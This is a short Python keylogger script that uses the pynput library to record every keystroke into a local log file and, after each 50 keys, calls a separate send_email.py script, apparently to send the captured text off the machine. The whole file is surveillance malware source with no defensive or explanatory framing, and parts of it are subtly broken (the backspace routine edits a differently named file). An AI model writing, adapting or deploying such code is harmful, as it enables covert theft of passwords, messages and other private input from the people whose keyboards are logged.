from pynput.keyboard import Key, Listener
import os

key_count = 0

def delete_last_char():
    with open("log_file", "rb+") as log_file:
        log_file.seek(0,2)
        log_file.seek(log_file.tell() -1,0)
        log_file.truncate()
        
def on_press(key):
    global key_count

    key_count += 1
    key_to_write=""
    if key == Key.space:
        key_to_write = " "
    elif key == Key.enter:
        key_to_write = "\n"
    elif key == Key.tab:
        key_to_write = "\t"
    elif key == Key.backspace:
        delete_last_char()
    else:
        key_to_write = key
    
    with open("log_file.txt", "a") as log_file:
        log_file.write(str(key_to_write).replace("'", ""))

    if key_count >= 50:
        os.system("send_email.py")
        key_count = 0

with Listener(on_press=on_press) as listener:
    listener.join()
